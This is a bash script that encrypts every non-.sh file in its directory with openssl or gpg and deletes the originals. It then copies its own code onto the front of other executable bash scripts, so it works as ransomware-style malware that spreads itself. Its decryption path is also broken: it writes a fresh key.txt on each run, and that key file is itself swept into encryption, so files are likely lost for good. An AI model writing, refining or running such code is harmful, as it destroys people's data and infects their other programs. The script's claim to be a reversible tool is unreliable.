#!/bin/bash
if ! command -v openssl &> /dev/null
then
    if ! command -v gpg &> /dev/null
    then
        echo "GPG could not be found and OpenSSL neither. Aborting."
        exit 1
    fi
fi
generate_key() {
    if command -v openssl &> /dev/null; then
        openssl rand -base64 32 > key.txt
    elif command -v gpg &> /dev/null; then
        gpg --gen-random --armor 1 32 > key.txt
    else
        echo "Error: Neither openssl nor gpg is available."
        exit 1
    fi
}

# Function to encrypt a file
encrypt_file() {
    local file="$1"
    local key="$2"
    
    # Check if openssl is available
    if command -v openssl &> /dev/null; then
        openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -pass "file:$key" > /dev/null 2>&1
    # Check if gpg is available
    elif command -v gpg &> /dev/null; then
        gpg --symmetric --cipher-algo AES256 --output "$file.gpg" --passphrase-file "$key" "$file" > /dev/null 2>&1
    else
        exit 1
    fi

    # Delete the original file
    rm "$file"
}

# Function to decrypt a file
decrypt_file() {
    local file="$1"
    local key="$2"
    
    # Check if openssl is available
    if command -v openssl &> /dev/null; then
        openssl enc -d -aes-256-cbc -in "$file" -out "${file%.enc}" -pass "file:$key" > /dev/null 2>&1
    # Check if gpg is available
    elif command -v gpg &> /dev/null; then
        gpg --decrypt --output "${file%.gpg}" --passphrase-file "$key" "$file" > /dev/null 2>&1
    else
        exit 1
    fi

    # Delete the encrypted file
    rm "$file"
}

# Function to insert the script into shell scripts
insert_into_shell_script() {
    local script="$1"
    local this_script="$0"
    
    # Check if the script is a shell script and not the current script
    if [ -x "$script" ] && [ "$(head -n 1 "$script")" = "#!/bin/bash" ] && [ "$script" != "$this_script" ]; then
        echo "Inserting into $script"
        cat "$this_script" | cat - "$script" > temp && mv temp "$script"
        chmod +x "$script"
    fi
}

# Check if correct number of arguments is provided
if [ $# -ne 1 ]; then
    echo "Usage: $0 <-e | -d>"
    exit 1
fi

option="$1"

# Generate key
generate_key

# Encrypt or decrypt files in the current directory
case "$option" in
    -e)
        # Encrypt files
        for file in *; do
            if [ "$file" != "$0" ] && [ "${file: -3}" != ".sh" ]; then
                encrypt_file "$file" "key.txt"
            fi
        done
        ;;
    -d)
        # Decrypt files
        for file in *; do
            if [ "${file: -4}" == ".enc" ] || [ "${file: -4}" == ".gpg" ]; then
                decrypt_file "$file" "key.txt"
            fi
        done
        ;;
    *)
        echo "Invalid option. Use -e for encryption or -d for decryption."
        exit 1
        ;;
esac

# Insert the script into shell scripts
for file in *; do
    if [ "$file" != "$0" ] && [ "${file: -3}" = ".sh" ]; then
        insert_into_shell_script "$file"
    fi
done

